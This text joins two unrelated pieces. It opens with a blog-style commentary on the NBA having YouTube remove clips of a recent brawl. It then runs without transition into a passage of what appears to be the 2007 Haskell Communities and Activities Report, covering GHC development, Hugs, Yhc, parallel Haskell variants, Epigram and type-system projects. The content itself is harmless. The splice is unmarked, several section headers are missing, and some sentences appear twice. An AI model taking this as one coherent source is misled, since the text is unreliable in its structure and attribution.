However , as an aside in a post on the Freakonomics blog , Steven Levitt notes that the NBA demanded that YouTube remove all clips of the fight -- and , indeed , if you look at the videos that were linked to or embedded from the various blogs , all are now missing .
This could just be the NBA continuing its history of misunderstanding the value of online content .
After all , just a few weeks ago , there was some discussion about how the NBA wanted to aggressively stop its videos from appearing on YouTube .
However , a quick search shows that there are plenty of NBA videos on YouTube .
But , if you search on brawl and nba , you get plenty of videos of the infamous Pacers / Pistons brawl ( that included the crowd ) from two years ago -- but all of the clips of the latest brawl have been removed .
It seems clear that the NBA is trying to hide this event to prevent people from seeing it .
This seems particularly short - sighted .
It 's as if they believe that by removing the videos from YouTube , people wo n't know it happened -- despite being blasted all over the news , including seemingly endless replays .
Forcing the videos off YouTube suggests that the NBA is n't trying to deal with brawling , they 're just hoping if they hide the videos , everyone will forget about them .

Preface
You are reading the twelfth edition of the Haskell Communities and Activities Report – as always , containing entries from enthusiastic Haskellers all over the world .
This edition has 138 entries , 33 of them are completely new ( and therefore highlighted with a blue background ) , and 54 have had updates since the previous edition ( and have a header with a blue background ) .
All entries that have not been updated for a year or longer have been removed to make sure that your are reading information that is as up - to - date as possible .
I want to use the opportunity to thank all the contributors .
This report has 90 authors , but the number of total contributors to all the projects reported on is much , much greater .
I find it wonderful that the Haskell communities continue to be so diverse and open at the same time .
As always , I want to encourage you to watch out for projects that are missing from this report , and to make their authors aware of the report so that they can contribute to the November edition ( deadline probably around the end of October ) .
Feedback is very welcome at < hcar at haskell.org >.
Pleasant reading !

1.1 HaskellWiki and haskell.org Report by : Ashley Yakeley HaskellWiki is a MediaWiki installation running on haskell.org , including the haskell.org “ front page ” .
Anyone can create an account and edit and create pages .
Examples of content include : Documentation of the language and libraries
Explanation of common idioms
Suggestions and proposals for improvement of the language and libraries
Description of Haskell - related projects
News and notices of upcoming events
We encourage people to create pages to describe and advertise their own Haskell projects , as well as add to and improve the existing content .
All content is submitted and available under a “ simple permissive ” license ( except for a few legacy pages ) .
In addition to HaskellWiki , the haskell.org website hosts some ordinary HTTP directories .
The machine also hosts mailing lists .
There is plenty of space and processing power for just about anything that people would want to do there : if you have an idea for which HaskellWiki is insufficient , contact the maintainers , John Peterson and Olaf Chitil , to get access to this machine .

1.3 Planet Haskell Report by : Antti-Juhani Kaijanaho Status : active Planet Haskell is an aggregator of Haskell people ’s blogs and other Haskell - related news sites .
As of mid-October content from 29 blogs and other sites is being republished in a common format .
A common misunderstanding about Planet Haskell is that it republishes only Haskell content .
That is not its mission .
A Planet shows what is happening in the community , what people are thinking about or doing .
Thus Planets tend to contain a fair bit of “ off - topic ” material .
Think of it as a feature , not a bug .
A blog is eligible to Planet if it is being written by somebody who is active in the Haskell community , or by a Haskell celebrity ; also eligible are blogs that discuss Haskell - related matters frequently , and blogs that are dedicated to a Haskell topic ( such as a software project written in Haskell ) .
Note that at least one of these conditions must apply , and virtually no blog satisfies them all .
However , blogs will not be added to Planet without the blog author ’s consent .
To get a blog added , email Antti-Juhani Kaijanaho < antti- juhani at kaijanaho. fi > and provide evidence that the blog author consents to this ( easiest is to get the author send the email , but any credible method suffices ) .
Planet is hosted by Galois Connections , Inc. ( →7.1.3 ) as a service to the community .
The Planet maintainer is not affiliated with them .

The Haskell Weekly News ( HWN ) is a weekly newsletter covering developments in Haskell .
Content includes announcements of new projects , jobs , discussions from the various Haskell communities , notable project commit messages , Haskell in the blogspace , and more .
It is published in html form on The Haskell Sequence , via mail on the Haskell mailing list , on Planet Haskell ( →1.3 ) , and via RSS .
Headlines are published on haskell.org ( →1.1 ) .

1.5 The Monad .
Reader Report by : Wouter Swierstra
There are plenty of academic papers about Haskell and plenty of informative pages on the Haskell Wiki .
Unfortunately , there ’s not much between the two extremes .
That ’s where The Monad .
Reader tries to fit in : more formal than a Wiki page , but more casual than a journal article .
There are plenty of interesting ideas that maybe do n’t warrant an academic publication – but that does n’t mean these ideas are n’t worth writing about !
Communicating ideas to a wide audience is much more important than concealing them in some esoteric journal .
Even if its all been done before in the Journal of Impossibly Complicated Theoretical Stuff , explaining a neat idea about ‘ warm fuzzy things ’ to the rest of us can still be plain fun .
The Monad .
Reader is also a great place to write about a tool or application that deserves more attention .
Most programmers do n’t enjoy writing manuals ; writing a tutorial for The Monad .
Reader , however , is an excellent way to put your code in the limelight and reach hundreds of potential users .
I do try to publish a new issue quarterly , but I ’m completely reliant on your submissions .
So please consider contributing to the functional programming community by writing something for The Monad .
Reader !

1.6 Books and tutorials
Haskell is one of the leading languages for teaching functional programming , enabling students to write simpler and cleaner code , and to learn how to structure and reason about programs .
This introduction is ideal for beginners : it requires no previous programming experience and all concepts are explained from first principles via carefully chosen examples .
Each chapter includes exercises that range from the straightforward to extended projects , plus suggestions for further reading on more advanced topics .
The presentation is clear and simple , and benefits from having been refined and class - tested over several years .
Features : Powerpoint slides for each chapter freely available for instructors and students from the book ’s website ;
Solutions to exercises and examination questions ( with solutions ) available to instructors ;
All the code in the book is fully compliant with the latest release of Haskell , and can be downloaded from the web ;
Can be used with courses , or as a stand - along text for self - learning .
Publication details : Published by Cambridge University Press , January 2007 .
Paperback : ISBN 0521692695 ; Hardback : ISBN : 0521871727 .
Further information : http://www.cs.nott.ac.uk/~gmh/book.html
The Haskell wikibook is an attempt to build a community textbook that is at once free ( in cost and remixability ) , comprehensive and cohesive .
Since the last report , we have added some original content , giving a friendly introduction to advanced topics : Category Theory , Denotational Semantics , The Curry - Howard isomorphism and Zippers .
Thanks to David House and Apfelmus for their hard work and to the Haskell community for your helpful comments !
( Of course , one of our greatest dreams is a module by one of the very founders of the Haskell programming language . )
The wikibook is starting to be recognised as a useful resource for beginners in Haskell , and has been receiving some positive comments from the blogosphere .
The wikibook has even selected for inclusion into the list of “ featured books ” on the English wikibooks project .
It will now be prominently displayed on the wikibooks front page in rotation with other featured books .
Our community has been starting to grow , in the meantime .
For example , the Polish and Russian Haskell wikibooks have been rather active in the last six months .
Want to see a Haskell wikibook in your language ?
Be bold and get started !
While you ’re at it , you might even consider participating in our new mailing list , < wikibook at haskell.org > .

2 Implementations
GHC continues to thrive .
One indicator of how widely GHC is used is the number of bug reports we get .
Here is a graph showing how the number of bug reports filed has varied with time :
You could interpret these figures as saying that GHC is getting steadily more unreliable !
But we do n’t think so …we believe that it ’s mostly a result of more people using GHC , for more applications , on more platforms .
As well as more bug reports , we are getting more help from the community , too .
Some people regularly commit patches , and we get a steady trickle of patches emailed in from folk who ( mostly ) do not have commit rights , but who have built GHC , debugged a problem , sent us the patch .
Our thanks go out to Aaron Tomb , Alec Berryman , Alexey Rodriguez , Andrew Pimlott , Andy Gill , Bas van Dijk , Bernie Pope , Bjorn Bringert , Brian Alliet , Brian Smith , Chris Rodrigues , Claus Reinke , David Himmelstrup , David Waern , Judah Jacobson , Isaac Jones , Lennart Augustsson , Lennart Kolmodin , Manuel M T Chakravarty , Pepe Iborra , Ravi Nanavati , Samuel Bronson , Sigbjorn Finne , Spencer Janssen , Sven Panne , Tim Chevalier , Tim Harris , Tyson Whitehead , Wolfgang Thaller , and anyone else who has contributed but we have accidentally omitted .
As a result of this heavy usage , it has taken us nearly six months to stabilise GHC 6.6.1 , fixing over 100 reported bugs or infelicities in the already - fairly - solid GHC 6.6 .
The HEAD ( which will become GHC 6.8 ) embodies nine months of development work since we forked the tree for GHC 6.6 .
We are now aiming to get a stable set of features implemented in the HEAD , with a view to forking off the GHC 6.8 branch in the early summer .
As our last HCAR report indicated , there will be lots of new stuff in GHC 6.8 .
The rest of this entry describes the features that are likely to end up in 6.8 .
You can find binary snapshots at the download page http://www.haskell.org/ghc/dist/current/dist/
or build from sources available via the darcs repository ( http://darcs.haskell.org/ghc/).

Type system and front end We have completely replaced GHC ’s intermediate language with System FC ( X ) , an extension of System F with explicit equality witnesses .
This enables GHC to support GADTs and associated types , with two new simple but powerful mechanisms .
The paper is “ System F with Type Equality Coercions ” ( http://research.microsoft.com/~simonpj/papers/ext-f/)
Much of the conversion work was done by Kevin Donnelly , while he was on an internship at Microsoft .
Manuel Chakravarty has implemented “ data - type families ” ( aka indexed data types ) , a modest generalisation of the “ associated data types ” of our POPL ’05 paper “ Associated types with class ” ( http://research.microsoft.com/~simonpj/papers/assoc-types/)
This part is done .
Now we are working on “ type- synonym families ” ( aka type functions or associated type synonyms ( ICFP’05 ) ( http://research.microsoft.com/~simonpj/papers/assoc-types), which are considerably trickier that data type families , at least so far as type inference is concerned .
Tom Schrijvers is in Cambridge for three months to help us use ides from Constraint Handling Rules to solve the inference problem .
Type synonym families will almost completely fill the spot occupied by the always - troublesome functional dependencies , so we are quite excited about this .
Details are at http://haskell.org/haskellwiki/GHC/Indexed_types.
Simon PJ finally implemented “ implication constraints ” , which are the key to fixing the interaction between GADTs and type classes .
GHC ’s users have been very polite about this collection of bugs , but they are now finally fixed .
Implication constraints are described by Martin Sulzmann in “ A framework for Extended Algebraic Data Types ” ( http://www.comp.nus.edu.sg/~sulzmann/publications/tr-eadt.ps.gz).
Björn Bringert ( a GHC Hackathon graduate ) implemented “ standalone deriving ” , which allows you to write a ‘ deriving ’ declaration anywhere , rather than only where the data type is declared .
Details of the syntax have not yet quite settled .
See also http://haskell.org/haskellwiki/GHC/StandAloneDeriving.
Lennart Augustsson implemented overloaded string literals .
So now just as a numeric literal has type forall a .
Num a => a , so a string literal has type forall a .
IsString a => a ,
The documentation is here : http://www.haskell.org/ghc/dist/current/docs/users_guide/other-type-extensions.html#overloaded-strings.
A less successful feature of the last year has been the story on impredicative instantiation ( see the paper “ Boxy types : type inference for higher - rank types and impredicativity ” ( http://research.microsoft.com/~simonpj/papers/boxy).
The feature is implemented , but the implementation is significantly more complicated than we expected ; and it delivers fewer benefits than we hoped .
For example , the system described in the paper does not type - check ( runST $ foo ) and everyone complains .
So Simon PJ added an even more ad - hoc extension that does left - to - right instantiation .
The power - to - weight ratio is not good .
We ’re still hoping that Dimitrios Vytiniotis and Stephanie Weirich will come out with a simpler system , even if it ’s a bit less powerful .
So do n’t get too used to impredicative instantiation as it now stands ; it might change !
Optimisations Simon PJ rewrote the Simplifier ( again ) .
It is n’t clear whether it was that alone , or whether something else happened too , but performance has improved quite significantly ; on the order of 12 % .
Roman Leshchinskiy , Don Stewart , and Duncan Coutts did some beautiful work on “ fusion ” ; see their paper “ Rewriting Haskell strings ” ( http://www.cse.unsw.edu.au/~dons/papers/CSL06.html).
This fusion work is already being heavily used in the parallel array library ( see below ) , and they are also working on replacing foldr / build fusion with stream fusion in the main base library ( →4.6.2 ) ( →4.6.3 ) .
Their work highlighted the importance of the SpecConstr transformation , which Simon PJ implemented several years ago .
Of course , they suggested many enhancements , many of which Simon PJ duly implemented ; see the new paper “ Constructor specialisation for Haskell programs ” ( http://research.microsoft.com/~simonpj/papers/spec-constr/).
Alexey Rodriguez visited us for three months from Utrecht , and implemented a new back - end optimisation called “ dynamic pointer tagging ” .
We have wanted to do this for ages , but it needed a skilled and insightful hacker to make it all happen , and Alexey is just that .
This optimisation alone buys us another 15 % performance for compiled programs : see the paper “ Dynamic pointer tagging ” ( http://research.microsoft.com/~simonpj/papers/ptr-tag/index.htm).
Concurrency Gabriele Keller , Manuel Chakravarty , and Roman Leshchinskiy , at the University of New South Wales , are collaborating with us on support for “ nested data - parallel computation ” in GHC .
We presented a paper “ Data parallel Haskell : a status report ” ( http://research.microsoft.com/~simonpj/papers/ndp) at the Declarative Aspects of Multicore Programing workshop in January 2007 , and made a first release of the library in March .
It ’s a pretty ambitious project , and we have quite a way to go .
You can peek at the current status on the project home page : http://haskell.org/haskellwiki/GHC/Data_Parallel_Haskell.
Tim Harris added support for ” invariants ” to GHC ’s Software Transactional Memory ( STM ) implementation .
Paper is “ Transactional memory with data invariants ” ( http://research.microsoft.com/~simonpj/papers/stm/).
At the moment GHC ’s “ garbage collector ” is single - threaded , even when GHC is running on a multiprocessor .
Roshan James spent the summer at Microsoft on an internship , implementing a multi- threaded GC ( http://hackage.haskell.org/trac/ghc/wiki/MotivationForParallelization).
It works !
But alas , doing GC with two processors runs no faster than with one !
( We do plan to investigate this further and find the source of the bottleneck . )
Peng Li , from the University of Pennsylvania , spent an exciting three months at Cambridge , working on a whole new architecture for concurrency in GHC .
( If you do n’t know Peng you should read his wonderful paper “ Combining Events And Threads For Scalable Network Services ” ( http://www.seas.upenn.edu/~lipeng/homepage/papers/lz07pldi.pdf) on implementing a network protocol stack in Haskell . )
At the moment GHC’s has threads , scheduling , forkIO , MVar s , transactional memory , and more besides , all “ baked into ” the run-time system and implemented in C .
If you want to change this implementation you have to either be Simon Marlow , or else very brave indeed .
With Peng ( and help from Andrew Tolmach , Olin Shivers , Norman Ramsey ) we designed a new , much lower - level set of primitives , that should allow us to implement all of the above “ in Haskell ” .
If you want a different scheduler , just code it up in Haskell , and plug it in .
Peng has a prototype running , but it has to jump the “ Marlow barrier ” of being virtually as fast as the existing C runtime ; so far we have not committed to including this in GHC , and it certainly wo n’t be in GHC 6.8 .
No paper yet , but look out for a Haskell Workshop 2007 submission .
Programming environment
There have been some big developments in the programming environment : Andy Gill implemented the Haskell Program Coverage ( http://haskell.org/haskellwiki/GHC/HPC) option ( - fhpc ) for GHC , which is solid enough to be used to test coverage in GHC itself .
( It turns out that the GHC testsuite gives remarkably good coverage over GHC already . )
) for GHC , which is solid enough to be used to test coverage in GHC itself .
( It turns out that the GHC testsuite gives remarkably good coverage over GHC already . )
Pepe Iborra , Bernie Pope , and Simon Marlow have leveraged the same “ tick ” points used in the Haskell Program Coverage work to implement a breakpoint debugger in GHCi http://hackage.haskell.org/trac/ghc/wiki/NewGhciDebugger.
Unlike HAT , which transforms the whole program into a new program that generates its own ( massive ) trace , this is a cheap - and - cheerful debugger .
It simply lets you set breakpoints and look around to see what is in the heap , more in the manner of a conventional debugger .
No need to recompile your program : it “ just works ” .
Aaron Tomb and Tim Chevalier are working on resurrecting External Core , whose implementation was not only bit -rotted , but also poorly designed ( by Simon PJ ) .
By GHC 6.8 we hope to be able to spit out External Core for any program , perhaps transform it in some external program , and read it in again , surviving the round trip unscathed .
It is now possible to compile to object code instead of bytecode inside GHCi , simply by setting a flag ( - fobject - code ) .
) .
The GHC API has seen some cleanup , and it should now be both more complete and slightly easier to use .
There is still plenty of work to do here , though .
David Waern has been working on integrating Haddock and GHC during his Google Summer of Code project last year .
The parts of this project that involved modifying GHC are done and integrated into the GHC tree .
The new version of Haddock based on GHC is usable but still experimental ; the darcs repository is http://darcs.haskell.org/SoC/haddock.ghc.
Libraries
The set of “ corelibs ” has been further streamlined , with parsec , regex - base , regex - compat , regex - posix and stm moved to extralibs in the HEAD .
This disentangles releases of these packages from the GHC release process , and also means that development builds of GHC are quicker as they do n’t need to build those libraries .

This disentangles releases of these packages from the GHC release process , and also means that development builds of GHC are quicker as they do n’t need to build those libraries .
We plan to extract parts of the base package into separate smaller packages ; see http://www.haskell.org/pipermail/libraries/2007-April/007342.html on the libraries mailing list .
2.2 Hugs Report by : Ross Paterson Status : stable , actively maintained , volunteers welcome The September 2006 release of Hugs fixes a few bugs found in the previous release , and updates the libraries to approximately match those of GHC 6.6 , which was about to release at the time .
The Windows build is now largely automated , thanks to Neil Mitchell , so it is easier to produce more frequent releases .
As with the previous release , the source distribution is available in two forms : a huge omnibus bundle containing the Hugs programs and lots of useful libraries , or a minimal bundle , with most of the libraries hived off as separate Cabal packages .
We hope that more library packages will be released independently , so that Hugs will become less reliant on development snapshots .
Obsolete non-hierarchical libraries will be removed in the next major release .
As ever , volunteers are welcome .
2.3 nhc98 Report by : Malcolm Wallace Status : stable , maintained nhc98 is a small , easy to install , compiler for Haskell ’98 .
Despite rumours to the contrary , nhc98 is still very much alive and working , although it does not see much new development these days .
The current public release is version 1.18 , with a new release expected soon for compatibility with ghc - 6.6 and the re-arranged hierarchical libraries .
We recently moved over to a darcs repo for maintenance .
The Yhc ( →2.4 ) fork of nhc98 is also making good progress .

The York Haskell Compiler ( yhc ) is a fork of the nhc98 ( →2.3 ) compiler , with goals such as increased portability , platform independent bytecode , integrated Hat support and generally being a cleaner code base to work with .
Yhc now compiles and runs almost all Haskell 98 programs , has basic FFI support – the main thing missing is haskell.org base libraries , which is being worked on .
Since that last HCAR we have focused on integrating the standard haskell.org libraries ( we have gained Data .
Map and others ) – but still have some way to go .
We have also enhanced our Yhc .
Core library , gaining many new users , and have produced an article for The Monad .

3.1 Variations of Haskell
3.1.1 Liskell Report by : Clemens Fruhwirth Status : experimental
When Haskell consists of Haskell semantics plus Haskell syntax , then Liskell consists of Haskell semantics plus Lisp syntax .
Liskell is Haskell on the inside but looks like Lisp on the outside , as in its source code it uses the typical Lisp syntax forms , namely symbol expressions , that are distinguished by their fully parenthesized prefix notation form .
Liskell captures the most Haskell syntax forms in this prefix notation form , for instance : if x then y else z becomes ( if x y z ) , while a + b becomes (+ a b ) .
Except for aesthetics , there is another argument for Lisp syntax : meta - programming becomes easy .
Liskell features a different meta- programming facility than the one found in Haskell with Template Haskell .
Before turning the stream of lexed tokens into an abstract Haskell syntax tree , Liskell adds an intermediate processing data structure : the parse tree .
The parse tree is essentially is a string tree capturing the nesting of lists with their enclosed symbols stored as the string leaves .
The programmer can implement arbitrary code expansion and transformation strategies before the parse tree is seen by the compilation stage .
After the meta - programming stage , Liskell turns the parse tree into a Haskell syntax tree before it sent to the compilation stage .
Thereafter the compiler treats it as regular Haskell code and produces a Haskell calling convention compatible output .
You can use Haskell libraries from Liskell code and vice versa .
Liskell is implemented as an extension to GHC and its darcs branch is freely available from the project ’s website .
The Liskell Prelude features a set of these parse tree transformations that enables traditional Lisp - styled meta- programming as with defmacro and backquoting .
The project ’s website demonstrates meta- programming application such as proof - of - concept versions of embedding Prolog inference , a minimalistic Scheme compiler and type - inference in meta- programming .
The future development roadmap includes stabilization of its design , improving the user experience for daily programming – especially error reporting – and improving interaction with Emacs .

The project at Macquarie University ( →7.3.5 ) to run Haskell on handheld devices based on Palm OS has a running implementation for small tests but , like most ports of languages to Palm OS , we are dealing with memory allocation issues .
Also , other higher priority projects have now intervened so this project is going into the background for a while .
3.1.3 Camila Report by : Jacome Cunha and Joost Visser
The Camila project explores how concepts from the VDM ++ specification language and the functional programming language Haskell can be combined .
On one hand , it includes experiments of expressing VDM ’s data types ( e.g. maps , sets , sequences ) , data type invariants , pre- and post - conditions , and such within the Haskell language .
On the other hand , it includes the translation of VDM specifications into Haskell programs .
Moreover , the use of the OOHaskell library ( →4.6.6 ) allows the definition of classes and objects and enables important features such as inheritance .
In the near future , support for parallelism and automatic translation of VDM ++ specifications into Haskell will be added to the libraries .
Camila goes beyond VDM ++ and has support for modelling software components .
The work done until now in this field is concerned with rendering and prototyping ( coalgebraic models of ) software components in Camila .
To encourage the use of this technology we have developed a tool to generate components from Camila specifications .
The advantage of component based development is that it makes possible to construct complex software from simple pre-existing building blocks .
So we have also animated an algebra of components to compose them in several ways .
Finally a way to animate components was also implemented .
Two implementation strategies were devised : one in terms of a direct encoding in “ plain ” Haskell , another resorting to type - level programming techniques , the latter offered interesting particularities .

3.2.1 GpH – Glasgow Parallel Haskell Report by : Phil Trinder Participants : Phil Trinder , Abyd Al Zain , Greg Michaelson , Kevin Hammond , Yang Yang , Jost Berthold , Murray Gross Status
A complete , GHC - based implementation of the parallel Haskell extension GpH and of evaluation strategies is available .
Extensions of the runtime - system and language to improve performance and support new platforms are under development .
System Evaluation and Enhancement A major revision of the parallel runtime environment for GHC 6.5 is currently under development .
Support for the parallel language Eden ( →3.2.2 ) exists and is currently being tested .
Support for the parallel language GpH is currently being added to this version of the runtime environment .
We have developed an adaptive runtime environment ( GRID - GUM ) for GpH on computational grids .
GRID - GUM incorporates new load management mechanisms that cheaply and effectively combine static and dynamic information to adapt to the heterogeneous and high - latency environment of a multi-cluster computational grid .
We have made comparative measures of GRID - GUM ’s performance on high / low latency grids and heterogeneous / homogeneous grids using clusters located in Edinburgh , Munich and Galashiels .
Results are published in : Al Zain A. Implementing High - Level Parallelism on Computational Grids , PhD Thesis , Heriot - Watt University , 2006 .

We are teaching parallelism to undergraduates using GpH at Heriot - Watt and Phillips Universitat Marburg .
GpH Applications GpH is being used to parallelise the GAP mathematical library in an EPSRC project ( GR / R91298 ) .
As part of the SCIEnce EU FP6 I3 project ( 026133 ) ( →7.3.9 ) that started in April 2006 we will use GpH and Java to provide access to Grid services from Computer Algebra ( CA ) systems , including GAP and Maple .
We will both produce Grid- parallel implementations of common CA library functions , and also wrap CA systems as Grid services .
Implementations
The GUM implementation of GpH is available in three development branches .
The focus of the development has switched to the version based on GHC 6.5 , and we plan to make an early prototype available from the GpH web site later this year .
The stable branch ( GUM - 4.06 , based on GHC - 4.06 ) is available for RedHat - based Linux machines .
The stable branch is available from the GHC CVS repository via tag gum - 4 - 06 .

Description Eden has been jointly developed by two groups at Philipps Universität Marburg , Germany and Universidad Complutense de Madrid , Spain .
The project has been ongoing since 1996 .
Currently , the team consists of the following people : in Madrid : Ricardo Peña , Yolanda Ortega - Mallén , Mercedes Hidalgo , Fernando Rubio , Clara Segura , Alberto Verdejo in Marburg : Rita Loogen , Jost Berthold , Steffen Priebe , Mischa Dieterle Eden extends Haskell with a small set of syntactic constructs for explicit process specification and creation .
While providing enough control to implement parallel algorithms efficiently , it frees the programmer from the tedious task of managing low - level details by introducing automatic communication ( via head - strict lazy lists ) , synchronisation , and process handling .
Eden ’s main constructs are process abstractions and process instantiations .
The function process :: ( a -> b ) ->
Process a b embeds a function of type ( a -> b ) into a process abstraction of type Process a b which , when instantiated , will be executed in parallel .
Process instantiation is expressed by the predefined infix operator ( # ) :: Process a b -> a -> b .
Higher - level coordination is achieved by defining skeletons , ranging from a simple parallel map to sophisticated replicated - worker schemes .
They have been used to parallelise a set of non-trivial benchmark programs .

Implementation A major revision of the parallel Eden runtime environment for GHC 6.7 is available on request .
Support for Glasgow parallel Haskell ( GpH ) is currently being added to this version of the runtime environment .
It is planned for the future to maintain a common parallel runtime environment for Eden , GpH and other parallel Haskells .

3.3 Type System / Program Analysis
3.3.1 Epigram Report by : Conor McBride and Wouter Swierstra Epigram is a prototype dependently typed functional programming language , equipped with an interactive editing and typechecking environment .
High - level Epigram source code elaborates into a dependent type theory based on Zhaohui Luo ’s UTT .
The definition of Epigram , together with its elaboration rules , may be found in ‘ The view from the left ’ by Conor McBride and James McKinna ( JFP 14 ( 1 ) ) .
Motivation Simply typed languages have the property that any subexpression of a well typed program may be replaced by another of the same type .
Such type systems may guarantee that your program wo n’t crash your computer , but the simple fact that True and False are always interchangeable inhibits the expression of stronger guarantees .
Epigram is an experiment in freedom from this compulsory ignorance .
Specifically , Epigram is designed to support programming with inductive datatype families indexed by data .
Examples include matrices indexed by their dimensions , expressions indexed by their types , search trees indexed by their bounds .
In many ways , these datatype families are the progenitors of Haskell ’s GADTs , but indexing by data provides both a conceptual simplification – the dimensions of a matrix are numbers – and a new way to allow data to stand as evidence for the properties of other data .
It is no good representing sorted lists if comparison does not produce evidence of ordering .
It is no good writing a type - safe interpreter if one ’s typechecking algorithm cannot produce well - typed terms .
Programming with evidence lies at the heart of Epigram ’s design .
Epigram generalises constructor pattern matching by allowing types resembling induction principles to express as how the inspection of data may affect both the flow of control at run time and the text and type of the program in the editor .
Epigram extracts patterns from induction principles and induction principles from inductive datatype families .
Current Status Whilst at Durham , Conor McBride developed the Epigram prototype in Haskell , interfacing with the xemacs editor .
Nowadays , a team of willing workers at the University of Nottingham are developing a new version of Epigram , incorporating both significant improvements over the previous version and experimental features subject to active research .
The Epigram system is also being used successfully by Thorsten Altenkirch , and more recently Conor McBride , in an undergraduate course on Computer Aided Formal Reasoning for two years
http://www.e-pig.org/darcs/g5bcfr/.
Several final year students have successfully completed projects that involved both new applications of and useful contributions to Epigram .
Peter Morris is working on how to build the datatype system of Epigram from a universe of containers .
This technology would enable datatype generic programming from the ground up .
Central to these ideas is the concept of indexed container that has been developed recently .
There are ongoing efforts to elaborate the ideas in Edwin Brady ’s PhD thesis about efficiently compiling dependently typed programming languages .
We have started writing a stand - alone editor for Epigram using Gtk2Hs ( →4.8.3 ) .
Thanks to a most helpful visit from Duncan Coutts and Axel Simon , two leading Gtk2 Hs developers , we now have the beginnings of a structure editor for Epigram 2 .
For the moment , we are also looking into a cheap terminal front - end .
There has also been steady progress on Epigram 2 itself .
Most of the recent progress has been on the type theoretic basis underpinning Epigram .
A new representation of the core syntax has been designed to facilitate bidirectional type checking .
The semantics of individual terms are glued to their syntactical representation .
We have started implementing observational equality , combining the benefits of both intensional and extensional notions of equality .
The lion ’s share of the core theory has already been implemented , but there is still plenty of work to do .
Whilst Epigram seeks to open new possibilities for the future of strongly typed functional programming , its implementation benefits considerably from the present state of the art .
Our implementation makes considerable use of applicative functors , higher - kind polymorphism and type classes .
Moreover , its denotational approach translates Epigram ’s lambda - calculus directly into Haskell’s .
On a more practical note , we have recently shifted to the darcs version control system and cabal framework .
Epigram source code and related research papers can be found on the web at http://www.e-pig.org and its community of experimental users communicate via the mailing list < epigram at durham.ac.uk >.
The current implementation is naive in design and slow in practice , but it is adequate to exhibit small examples of Epigram ’s possibilities .
The new implementation will be much less rudimentary .
At the moment , there is direct low - level interface to the state of the proof state called Ecce .
Its documentation , together with other Epigram 2 design documents , can be found at http://www.e-pig.org/epilogue/.
Chameleon is a Haskell style language which integrates sophisticated reasoning capabilities into a programming language via its CHR programmable type system .
Thus , we can program novel type system applications in terms of CHRs which previously required special - purpose systems .
Chameleon including examples and documentation is available via http://taichi.ddns.comp.nus.edu.sg/taichiwiki/ChameleonHomePage
Latest developments
The latest developments mostly concern the transfer of ideas / methods found in Chameleon to other systems .
For example , implication constraints as pioneered in Chameleon have found their way into GHC 6.6 .
We also plan to integrate some of Chameleon ’s type inference capabilities into Tim Sheard ’s Omega .
XHaskell is an extension of Haskell with XDuce style regular expression types and regular expression pattern matching .
We have much improved the implementation which can found under the XHaskell home - page : http://taichi.ddns.comp.nus.edu.sg/taichiwiki/XhaskellHomePage
Latest developments
We are currently working on the integration of type classes .
A new version is planned for June 2007 .
ADOM is an agent - oriented extension of Haskell with a unique approach to the implementation of cognitive Belief - Desire - Intention ( BDI ) agents .
In ADOM , agent reasoning operations are viewed as monadic computations .
Agent reasoning operations can be stratified : Low - level reasoning operations involve the agents beliefs and actions whereas high - level reasoning operations involve the agents goals and plans .
Monads allow us to compose various levels of reasoning together , while maintaining clear and distinct separation between the different levels .
ADOM can be used directly as an agent - oriented domain specific language , or used to build more higher level BDI agent abstractions on top of it ( eg. AgentSpeak , 3APL ) .
ADOM also introduces the use of Constraint Handling Rules ( CHR ) , embedded with Haskell , to directly model the agent ’s belief of its dynamically changing domain ( world ) and it ’s actions which invoke change to it ’s domain .
The key advantage of our approach are : CHRs provides a clear and concise representation and implementation of dynamically changing agent beliefs and actions .
Stratifying the various levels of agent cognitive reasoning by monads , maintains a distinct separation between different reasoning computations and their responsibilities .
We can also preserve certain desirable properties possessed by each level of computations .
For example , CHR notion of observable confluence .
Monadic computations can be composed to form more complex computations , hence ADOM can be easily extended with more complex functionalities .
For example , we can build higher level monadic computations that implements other BDI frameworks , like agentspeak or 3APL .

Latest developments
We are working on a much improved version which is scheduled for June 2007 .
3.3.5 EHC , ‘ Essential Haskell ’ Compiler Report by : Atze Dijkstra Participants : Atze Dijkstra , Jeroen Fokker , Arie Middelkoop , Doaitse Swierstra Status : active development
The purpose of the EHC project is to provide a description of a Haskell compiler which is as understandable as possible so it can be used for education as well as research .
For its description an Attribute Grammar system ( AG ) ( →4.3.3 ) is used as well as other formalisms allowing compact notation like parser combinators .
For the description of type rules , and the generation of an AG implementation for those type rules , we use the Ruler system ( →5.5.3 ) ( included in the EHC project ) .
The EHC project also tackles other issues :
In order to avoid overwhelming the innocent reader , the description of the compiler is organised as a series of increasingly complex steps .
Each step corresponds to a Haskell subset which itself is an extension of the previous step .
The first step starts with the essentials , namely typed lambda calculus .
Each step corresponds to an actual , that is , an executable compiler .
Each of these compilers is a compiler in its own right so experimenting can be done in isolation of additional complexity introduced in later steps .
The description of the compiler uses code fragments which are retrieved from the source code of the compilers .
In this way the description and source code are kept synchronized .
Currently EHC already incorporates more advanced features like higher - ranked polymorphism , partial type signatures , class system , explicit passing of implicit parameters ( i.e. class instances ) , extensible records , kind polymorphism .
Part of the description of the series of EH compilers is available as a PhD thesis , which incorporates previously published material on the EHC project .
The compiler is used for small student projects as well as larger experiments such as the incorporation of an Attribute Grammar system .
Current activities
We are currently working on the following : A Haskell98 frontend , supporting most of Haskell98 , done by Atze Dijkstra .
A GRIN ( Graph Reduction Intermediate Notation , see below ) like backend , which allows experimenting with global program optimization .
This is done by Jeroen Fokker .
Arie Middelkoop will continue with the development of the Ruler system ( →5.5.3 ) .

3.3.6 Uniqueness Typing Report by : Edsko de Vries Participants : Rinus Plasmeijer , David M Abrahamson Status : ongoing
An important feature of pure functional programming languages is referential transparency .
A consequence of referential transparency is that functions cannot be allowed to modify their arguments , unless it can be guaranteed that they have the sole reference to that argument .
This is the basis of uniqueness typing .
We have been developing a uniqueness type system based on that of the language Clean but with various improvements : no subtyping is required , and the type language does not include constraints ( types in Clean often involve implications between uniqueness attribute ) .
This makes the type system sufficiently similar to standard Hindley / Milner type systems that ( 1 ) standard inference algorithms can be applied , and ( 2 ) that modern extensions such as arbitrary rank types and generalized algebraic data types ( GADTs ) can easily be incorporated .
Although our type system is developed in the context of the language Clean , it is also relevant to Haskell because the core uniqueness type system we propose is very similar to the Haskell ’s core type system .
Moreover , we are currently working on defining syntactic conventions , which programmers can use to write type annotations , and compilers can use to report types , without mentioning uniqueness at all .

